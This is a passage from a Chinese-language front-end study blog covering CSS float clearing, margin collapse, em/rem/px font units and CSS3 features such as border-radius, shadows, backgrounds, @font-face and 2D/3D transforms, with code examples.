class="line">.clearfix &#123;</span><br><span class="line">    *zoom: 1; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>使用before和after双伪元素清除浮动<font color="#FF00FF">（推荐）</font></li></ol><p>完全符合闭合浮动思想的方法。<br>父元素中加一个类名为clearfix,需要兼容IE6、7<br>代表网站：小米、腾讯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.clearfix:before, .clearfix:after &#123;</span><br><span class="line">       content: &quot;&quot;; </span><br><span class="line">       display: table;</span><br><span class="line">   &#125;</span><br><span class="line">   .clearfix:after &#123;</span><br><span class="line">       clear: both;</span><br><span class="line">   &#125;</span><br><span class="line">   .clearfix &#123;</span><br><span class="line">       *zoom: 1;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h1 id="padding-margin-百分比单位依据"><a href="#padding-margin-百分比单位依据" class="headerlink" title="padding , margin 百分比单位依据"></a>padding , margin 百分比单位依据</h1><p>在CSS 盒模型中，依据CSS2.2文档，<font color="#FF00FF">margin与padding的百分比指定值时，一律参考包含盒的宽度。</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.father&#123;</span><br><span class="line">    height: 100px;</span><br><span class="line">    width: 200px;</span><br><span class="line">    border: solid;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.son&#123;</span><br><span class="line">    margin: 20%;</span><br><span class="line">    padding: 20%;</span><br><span class="line">    width: 50%;</span><br><span class="line">    height: 50%;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如下图，包括padding-top/bottom,margin-top/bottom在内，所有padding和margin均是参考的包含块的宽度，故它们的值为200px * 20% = 40px。</p><h1 id="父子边距重合"><a href="#父子边距重合" class="headerlink" title="父子边距重合"></a>父子边距重合</h1><p><strong>效果：</strong><br>边界重叠是指两个或多个盒子(可能相邻也可能嵌套)的相邻边界(其间没有任何非空内容、补白、边框)重合在一起而形成一个单一边界。<br><strong>父子元素的边界重叠</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">  .parent &#123;</span><br><span class="line">    background: #e7a1c5;</span><br><span class="line">  &#125;</span><br><span class="line">  .parent .child &#123;</span><br><span class="line">    background: #c8cdf5;</span><br><span class="line">    height: 100px;</span><br><span class="line">    margin-top: 10px;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;section class=&quot;parent&quot;&gt;</span><br><span class="line">  &lt;article class=&quot;child&quot;&gt;&lt;/article&gt;</span><br><span class="line">&lt;/section&gt;</span><br></pre></td></tr></table></figure><p><img src="http://files.shanqianche.cn/20228/1659687771174.png" alt="以为期待的效果"></p><p><img src="http://files.shanqianche.cn/20228/1659687834728.png" alt="而实际上效果如下"><br><font color="#FF00FF">在这里父元素的高度不是 110px，而是 100px，在这里发生了高度坍塌。</font><br><strong>产生原因：</strong><br><font color="#FF8C00">如果块元素的margin-top与它的第一个子元素的margin-top之间没有border、padding、inlinecontent、clearance来分隔，或者块元素的 margin-bottom 与它的最后一个子元素的 margin-bottom 之间没有border、padding、inlinecontent、height、min-height、max-height分隔，那么外边距会塌陷</font>。子元素多余的外边距会被父元素的外边距截断。<br><strong>解决办法：</strong><br>父子元素的边界重叠得解决方案： 在父元素上加上 overflow:hidden;使其成为 BFC。</p><h1 id="css字体大小设置（三种）-em-rem-px"><a href="#css字体大小设置（三种）-em-rem-px" class="headerlink" title="css字体大小设置（三种）.em rem px"></a>css字体大小设置（三种）.em rem px</h1><h2 id="px（绝对长度单位）"><a href="#px（绝对长度单位）" class="headerlink" title="px（绝对长度单位）"></a>px（绝对长度单位）</h2><p>相信对于前端来说px这个单位是大家并不陌生，px这个单位，兼容性可以说是相当可以，大家对px的了解肯 定是没有很大的问题的。</p><h2 id="em（相对长度单位）"><a href="#em（相对长度单位）" class="headerlink" title="em（相对长度单位）"></a>em（相对长度单位）</h2><p><strong>使用：</strong></p><ol><li>浏览器的默认字体都是16px，那么<font color="#FF8C00">1em=16px</font>，以此类推计算12px=0.75em，10px=0.625em,2em=32px；</li><li>这样使用很复杂，很难很好的与px进行对应,也导致书写、使用、视觉的复杂(0.75em、0.625em全是小数点)</li><li>为了<font color="#FF00FF">简化font-size的换算，我们在body中写入一下代码</font></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">body &#123;font-size: 62.5%;  &#125; /*  公式16px*62.5%=10px  */ </span><br></pre></td></tr></table></figure><p>这样页面中1em=10px,1.2em=12px,1.4em=14px,1.6em=16px，使得视觉、使用、书写都得到了极大的帮助。<br>例子如下：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">div</span> <span class="keyword">class</span>=<span class="string">&quot;font1&quot;</span> style=<span class="string">&#x27;font-size:1.6em&#x27;</span>&gt;我是<span class="number">1.6</span>em&lt;/<span class="keyword">div</span>&gt;</span><br></pre></td></tr></table></figure><p><strong>缺点：</strong></p><ul><li>em的值并不是固定的；</li><li>em会<font color="#FF00FF">继承父级元素的字体大小</font>（参考物是<font color="#FF00FF">父元素的font-size</font>；）；</li><li>em中所有的字体都是相对于父元素的大小决定的；所以如果一个设置了font-size:1.2em的元素在另一个设置了font-size:1.2em的元素里，而这个元素又在另一个设置了font-size:1.2em的元素里，那么最后计算的结果是1.2X1.2X1.2=1.728em</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;big&quot;&gt;</span><br><span class="line">    我是大字体</span><br><span class="line">   &lt;div class=&quot;small&quot;&gt;我是小字体&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">     body &#123;font-size: 62.5%; &#125; /*  公式:16px*62.5%=10px  */ </span><br><span class="line">    .big&#123;font-size: 1.2em&#125;</span><br><span class="line">    .small&#123;font-size: 1.2em&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><p><strong>但运行结果small的字体大小为：1.2em*1.2em=1.44em</strong></p><h2 id="rem（相对长度单位）"><a href="#rem（相对长度单位）" class="headerlink" title="rem（相对长度单位）"></a>rem（相对长度单位）</h2><p><strong>使用：</strong></p><ul><li>浏览器的默认字体都是16px，那么1rem=16px，以此类推计算12px=0.75rem，10px=0.625rem，2rem=32px；</li><li>这样使用很复杂，很难很好的与px进行对应,也导致书写、使用、视觉的复杂(0.75rem、0.625em全是小数点) ；</li><li>为了简化font-size的换算，<font color="#FF8C00">我们在根元素html中加入font-size: 62.5%;</font></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">html &#123;font-size: 62.5%;  &#125; /*  公式16px*62.5%=10px  */  </span><br></pre></td></tr></table></figure><p>这样页面中1rem=10px,1.2rem=12px,1.4rem=14px,1.6rem=16px;使得视觉、使用、书写都得到了极大的帮助；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;font1&quot; style=&#x27;font-size:1.6rem&#x27;&gt;我是1.6rem=16px&lt;/div&gt;</span><br></pre></td></tr></table></figure><p><strong>特点：</strong></p><ul><li>rem单位可谓集相对大小和绝对大小的优点于一身</li><li><font color="#FF8C00">和em不同的是rem总是相对于根元素(如:root{})，而不像em一样使用级联的方式来计算尺寸。这种相对单位使用起来更简单</font>。</li><li><font color="#FF8C00">rem支持IE9及以上，意思是相对于根元素html（网页），不会像em那样，依赖于父元素的字体大小，而造成混乱</font>。使用起来安全了很多。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;big&quot;&gt;</span><br><span class="line">    我是14px=1.4rem&lt;div class=&quot;small&quot;&gt;我是12px=1.2rem&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">    html &#123;font-size: 10px;  &#125; /*  公式16px*62.5%=10px  */  </span><br><span class="line">    .big&#123;font-size: 1.4rem&#125;</span><br><span class="line">    .small&#123;font-size: 1.2rem&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>注意：</strong><br>值得注意的浏览器支持问<font color="#FF8C00">题： IE8，Safari 4或 iOS 3.2中不支持rem单位。</font><br>如果你的用户群都使用最新版的浏览器，那推荐使用rem，如果要考虑兼容性，那就使用px,或者两者同时使用。</p><h1 id="css3新特性-TODO-未完成"><a href="#css3新特性-TODO-未完成" class="headerlink" title="css3新特性 [TODO 未完成]"></a>css3新特性 [TODO 未完成]</h1><h2 id="CSS3-边框"><a href="#CSS3-边框" class="headerlink" title="CSS3 边框"></a>CSS3 边框</h2><h3 id="创建圆角"><a href="#创建圆角" class="headerlink" title="创建圆角"></a>创建圆角</h3><blockquote><p>语法： border-radius :number number;</p></blockquote><p>length： 由浮点数字和单位标识符组成的长度值（如：20px）。不可为负值，<font color="#FF8C00">如果为负值则与0展示效果一样</font>。<font color="#FF8C00">第一个值设置其水平半径，第二个值设置其垂直半径</font>，<em>如果第二个值省略则默认第二个值等于第一个值</em>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">div&#123;</span><br><span class="line">  border: 1px solid;</span><br><span class="line">  /* 设置每个圆角水平半径和垂直半径都为30px */</span><br><span class="line">  border-radius: 30px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>border-radius是4个角的缩写方法。四个角的表示顺序与border类似<font color="#FF8C00">按照border-top-left-radius、border-top-right-radius、border-bottom-right-radius、border-bottom-left-radius的顺序来设置</font>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">div&#123;</span><br><span class="line">  border: 1px solid;</span><br><span class="line">  /* 如果 / 前后的值都存在，那么 / 前面的值设置其水平半径，/ 后面值设置其垂直半径，如果没有 / ，则水平和垂直半径相等 */</span><br><span class="line">  border-radius: 10px 15px 20px 30px / 20px 30px 10px 15px;</span><br><span class="line"></span><br><span class="line">  /* 上面写法等价于下面的写法，第一个值是水平半径，第二个值是垂直半径 */</span><br><span class="line">  border-top-left-radius: 10px 20px;</span><br><span class="line">  border-top-right-radius: 15px 30px;</span><br><span class="line">  border-bottom-right-radius: 20px 10px;</span><br><span class="line">  border-bottom-left-radius: 30px 15px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>border-radius指定不同数量的值遵循对角相等的原则，即指定了值的取指定值，没有指定值的与对角值相等，对角相等模型</p><h3 id="边框阴影"><a href="#边框阴影" class="headerlink" title="边框阴影"></a>边框阴影</h3><p>通过属性box-shadow向边框添加阴影。<br>语法： {box-shadow : [inset] x-offset y-offset blur-radius extension-radius spread-radiuscolor}<br>说明：<strong>对象选择器 {box-shadow:[投影方式] X轴偏移量 Y轴偏移量 模糊半径 阴影扩展半径 阴影颜色}</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">div&#123;</span><br><span class="line">  /* 内阴影，向右偏移10px，向下偏移10px，模糊半径5px，阴影缩小10px */</span><br><span class="line">  box-shadow: inset 10px 10px 5px -10px #888888;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="边框图片"><a href="#边框图片" class="headerlink" title="边框图片"></a>边框图片</h3><p>语法：<br><strong>border-image : border-image-source || border-image-slice [ / border-image-width] || border-image-repeat</strong><br>border-image ： none | image [ number | percentage]{1,4} [ / border-width&gt;{1,4} ] ? [ stretch | repeat | round ]{0,2}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">div&#123;</span><br><span class="line">  border-image:url(border.png) 30 30 round;</span><br><span class="line"></span><br><span class="line">  border-image: url(border.png) 20/10px repeat;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CSS3-背景"><a href="#CSS3-背景" class="headerlink" title="CSS3 背景"></a>CSS3 背景</h2><h3 id="background-size属性"><a href="#background-size属性" class="headerlink" title="background-size属性"></a>background-size属性</h3><p>在 CSS3 之前，背景图片的尺寸是由图片的实际尺寸决定的。在 CSS3 中，可以设置背景图片的尺寸，这就允许我们在不同的环境中重复使用背景图片。可以像素或百分比规定尺寸。<strong>如果以百分比规定尺寸，那么尺寸相对于父元素的宽度和高度。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">div&#123;</span><br><span class="line">  background:url(bg_flower.gif);</span><br><span class="line">  /* 通过像素规定尺寸 */</span><br><span class="line">  background-size:63px 100px;</span><br><span class="line"></span><br><span class="line">  /* 通过百分比规定尺寸 */</span><br><span class="line">  background-size:100% 50%;</span><br><span class="line">  background-repeat:no-repeat;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="background-origin属性"><a href="#background-origin属性" class="headerlink" title="background-origin属性"></a>background-origin属性</h3><p>规定背景图片的定位区域，背景图片可以放置于content-box、padding-box或border-box区域，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">div&#123;</span><br><span class="line">  background:url(bg_flower.gif);</span><br><span class="line">  background-repeat:no-repeat;</span><br><span class="line">  background-size:100% 100%;</span><br><span class="line">  /* 规定背景图片的定位区域 */</span><br><span class="line">  background-origin:content-box;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="background-clip属性"><a href="#background-clip属性" class="headerlink" title="background-clip属性"></a>background-clip属性</h3><p>与background-origin属性相似，规定背景颜色的绘制区域，区域划分与background-origin属性相同。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">div&#123;</span><br><span class="line">  background-color:yellow;</span><br><span class="line">  background-clip:content-box;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="CSS3-多重背景图片"><a href="#CSS3-多重背景图片" class="headerlink" title="CSS3 多重背景图片"></a>CSS3 多重背景图片</h3><p>CSS3 允许为元素设置多个背景图像</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">body&#123;</span><br><span class="line">  background-image:url(bg_flower.gif),url(bg_flower_2.gif);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CSS3-文本效果"><a href="#CSS3-文本效果" class="headerlink" title="CSS3 文本效果"></a>CSS3 文本效果</h2><ol><li>text-shadow属性</li></ol><p>给为本添加阴影，能够<font color="#FF8C00">设置水平阴影、垂直阴影、模糊距离，以及阴影的颜色。</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">h1&#123;</span><br><span class="line">  text-shadow: 5px 5px 5px #FF0000;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>text-wrap 属性</li></ol><p>设置区域内的<font color="#FF00FF">自动换行。</font><br>语法：text-wrap: normal | none | unrestricted | suppress | break-word;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/* 允许对长单词进行拆分，并换行到下一行 */</span><br><span class="line">p &#123;word-wrap:break-word;&#125;</span><br></pre></td></tr></table></figure><table><thead><tr><th>值</th><th>描述</th></tr></thead><tbody><tr><td>normal</td><td>只在允许的换行点进行换行。</td></tr><tr><td>none</td><td>不换行。元素无法容纳的文本会溢出。</td></tr><tr><td>break-word</td><td>在任意两个字符间换行。</td></tr><tr><td>suppress</td><td>压缩元素中的换行。<font color="#FF00FF">浏览器只在行中没有其他有效换行点时进行换行。</font></td></tr></tbody></table><h2 id="CSS3-字体"><a href="#CSS3-字体" class="headerlink" title="CSS3 字体"></a>CSS3 字体</h2><ol><li>字体定义</li></ol><p><font color="#FF8C00">在 CSS3 之前，web 设计师必须使用已在用户计算机上安装好的字体。但是通过 CSS3，web 设计师可以使用他 们喜欢的任意字体。当找到或购买到希望使用的字体时，可将该字体文件存放到 web 服务器上，它会在需要时 被自动下载到用户的计算机上。</font>字体<font color="#FF00FF">需要在 CSS3 @font-face 规则</font>中定义。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/* 定义字体 */</span><br><span class="line">@font-face&#123;</span><br><span class="line">  font-family: myFont;</span><br><span class="line">  src: url(&#x27;Sansation_Light.ttf&#x27;),</span><br><span class="line">       url(&#x27;Sansation_Light.eot&#x27;);     /* IE9+ */</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">div&#123;</span><br><span class="line">  font-family:myFont;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="2"><li>使用粗体字体</li></ol><p>“Sansation_Light.ttf”文件 是定义的正常字体，”Sansation_Bold.ttf” 是另一个字体文件，它包含了 Sansation 字体的粗体字符。<font color="#FF8C00">只要 font-family 为 “myFirstFont” 的文本需要显示为粗体，浏览器就会使用该字体。</font><br><strong>（其实没弄清楚这样处理的原因，经测试直接在html中通过 b 标签也可以实现加粗的效果）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">/* 定义正常字体 */</span><br><span class="line">@font-face&#123;</span><br><span class="line">  font-family: myFirstFont;</span><br><span class="line">  src: url(&#x27;/example/css3/Sansation_Light.ttf&#x27;),</span><br><span class="line">       url(&#x27;/example/css3/Sansation_Light.eot&#x27;); /* IE9+ */</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* 定义粗体时使用的字体 */</span><br><span class="line">@font-face&#123;</span><br><span class="line">  font-family: myFirstFont;</span><br><span class="line">  src: url(&#x27;/example/css3/Sansation_Bold.ttf&#x27;),</span><br><span class="line">       url(&#x27;/example/css3/Sansation_Bold.eot&#x27;); /* IE9+ */</span><br><span class="line">  /* 标识属性 */</span><br><span class="line">  font-weight:bold;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">div&#123;</span><br><span class="line">  font-family:myFirstFont;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CSS3-2D-转换"><a href="#CSS3-2D-转换" class="headerlink" title="CSS3 2D 转换"></a>CSS3 2D 转换</h2><p>通过 CSS3 转换，我们能够对元素进行<strong>移动、缩放、转动、拉长或拉伸，转换</strong>是使元素改变形状、尺寸和位置的一种效果。</p><h4 id="translate-方法"><a href="#translate-方法" class="headerlink" title="translate() 方法"></a>translate() 方法</h4><p>通过 translate(x , y) 方法，元素根据给定的 left（x 坐标） 和 top（y 坐标） 位置参数<font color="#FF8C00">从其当前位置</font>移动，x为正值向右移动，为负值向左移动；y为正值向下移动，为负值向上移动；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">div&#123;</span><br><span class="line">  transform: translate(50px,100px);</span><br><span class="line">  -ms-transform: translate(50px,100px);        /* IE 9 */</span><br><span class="line">  -webkit-transform: translate(50px,100px);     /* Safari and Chrome */</span><br><span class="line">  -o-transform: translate(50px,100px);         /* Opera */</span><br><span class="line">  -moz-transform: translate(50px,100px);        /* Firefox */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="rotate-方法"><a href="#rotate-方法" class="headerlink" title="rotate() 方法"></a>rotate() 方法</h3><p>控制元素顺时针旋转给定的角度。为正值，元素将顺时针旋转。为负值，元素将逆时针旋转。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">div&#123;</span><br><span class="line">  transform: rotate(30deg);</span><br><span class="line">  -ms-transform: rotate(30deg);        /* IE 9 */</span><br><span class="line">  -webkit-transform: rotate(30deg);    /* Safari and Chrome */</span><br><span class="line">  -o-transform: rotate(30deg);         /* Opera */</span><br><span class="line">  -moz-transform: rotate(30deg);       /* Firefox */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="scale-方法"><a href="#scale-方法" class="headerlink" title="scale() 方法"></a>scale() 方法</h3><p>根据给定的宽度（X 轴）和高度（Y 轴）参数，<font color="#FF8C00">控制元素的尺寸的增加、减少。</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">div&#123;</span><br><span class="line">  transform: scale(2,4);</span><br><span class="line">  -ms-transform: scale(2,4);         /* IE 9 */</span><br><span class="line">  -webkit-transform: scale(2,4);     /* Safari 和 Chrome */</span><br><span class="line">  -o-transform: scale(2,4);         /* Opera */</span><br><span class="line">  -moz-transform: scale(2,4);       /* Firefox */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="skew-方法"><a href="#skew-方法" class="headerlink" title="skew() 方法"></a>skew() 方法</h3><p><strong>根据给定的水平线（X 轴）和垂直线（Y 轴）参数设置元素翻转给定的角度。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/* 设置围绕 X 轴把元素翻转 30 度，围绕 Y 轴翻转 20 度。 */</span><br><span class="line">div&#123;</span><br><span class="line">  transform: skew(30deg,20deg);</span><br><span class="line">  -ms-transform: skew(30deg,20deg);         /* IE 9 */</span><br><span class="line">  -webkit-transform: skew(30deg,20deg);     /* Safari and Chrome */</span><br><span class="line">  -o-transform: skew(30deg,20deg);          /* Opera */</span><br><span class="line">  -moz-transform: skew(30deg,20deg);        /* Firefox */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="matrix-方法"><a href="#matrix-方法" class="headerlink" title="matrix() 方法"></a>matrix() 方法</h3><p><font color="#FF00FF">matrix() 方法把所有 2D 转换方法组合在一起。matrix() 方法需要六个参数，包含数学函数，允许旋转、缩放、移动以及倾斜元素。</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/* 使用 matrix 方法将 div 元素旋转 30 度 */</span><br><span class="line">div&#123;</span><br><span class="line">  transform:matrix(0.866,0.5,-0.5,0.866,0,0);</span><br><span class="line">  -ms-transform:matrix(0.866,0.5,-0.5,0.866,0,0);          /* IE 9 */</span><br><span class="line">  -moz-transform:matrix(0.866,0.5,-0.5,0.866,0,0);         /* Firefox */</span><br><span class="line">  -webkit-transform:matrix(0.866,0.5,-0.5,0.866,0,0);      /* Safari and Chrome */</span><br><span class="line">  -o-transform:matrix(0.866,0.5,-0.5,0.866,0,0);           /* Opera */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2D-Transform-方法汇总"><a href="#2D-Transform-方法汇总" class="headerlink" title="2D Transform 方法汇总"></a>2D Transform 方法汇总</h3><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td>matrix(n,n,n,n,n,n)</td><td>定义 2D 转换，使用六个值的矩阵。</td></tr><tr><td>translate(x,y)</td><td>定义 2D 转换，沿着 X 和 Y 轴移动元素。</td></tr><tr><td>translateX(n)</td><td>定义 2D 转换，沿着 X 轴移动元素。</td></tr><tr><td>translateY(n)</td><td>定义 2D 转换，沿着 Y 轴移动元素。</td></tr><tr><td>scale(x,y)</td><td>定义 2D 缩放转换，改变元素的宽度和高度。</td></tr><tr><td>scaleX(n)</td><td>定义 2D 缩放转换，改变元素的宽度。</td></tr><tr><td>scaleY(n)</td><td>定义 2D 缩放转换，改变元素的高度。</td></tr><tr><td>rotate(angle)</td><td>定义 2D 旋转，在参数中规定角度。</td></tr><tr><td>skew(x-angle,y-angle)</td><td>定义 2D 倾斜转换，沿着 X 和 Y 轴。</td></tr><tr><td>skewX(angle)</td><td>定义 2D 倾斜转换，沿着 X 轴。</td></tr><tr><td>skewY(angle)</td><td>定义 2D 倾斜转换，沿着 Y 轴。</td></tr></tbody></table><h2 id="CSS3-3D-转换"><a href="#CSS3-3D-转换" class="headerlink" title="CSS3 3D 转换"></a>CSS3 3D 转换</h2><p>CSS3 允许使用 3D 转换来对元素进行格式化</p><h3 id="rotateX-方法"><a href="#rotateX-方法" class="headerlink" title="rotateX() 方法"></a>rotateX() 方法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/* 设置元素围绕其 X 轴以给定的度数进行旋转 */</span><br><span class="line">div&#123;</span><br><span class="line">  transform: rotateX(120deg);</span><br><span class="line">  -webkit-transform: rotateX(120deg);   /* Safari 和 Chrome */</span><br><span class="line">  -moz-transform: rotateX(120deg);  /* Firefox */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="rotateY-旋转"><a href="#rotateY-旋转" class="headerlink" title="rotateY() 旋转"></a>rotateY() 旋转</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/* 设置元素围绕其 Y 轴以给定的度数进行旋转 */</span><br><span class="line">div&#123;</span><br><span class="line">  transform: rotateY(130deg);</span><br><span class="line">  -webkit-transform: rotateY(130deg);   /* Safari 和 Chrome */</span><br><span class="line">  -moz-transform: rotateY(130deg);  /* Firefox */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CSS3-过渡"><a href="#CSS3-过渡" class="headerlink" title="CSS3 过渡"></a>CSS3 过渡</h2><p><strong>通过 CSS3可以在不使用 Flash 动画或 JavaScript 的情况下，当元素从一种样式变换为另一种样式时为元素添加效果</strong><br>要实现这一点，必须规定以下两项内容：</p><ul><li>设置添加过渡效果的 CSS 属性；</li><li>设置过渡效果的时长；</li></ul><p><strong>注意： 如果时长未设置，则不会有过渡效果，因为默认值是 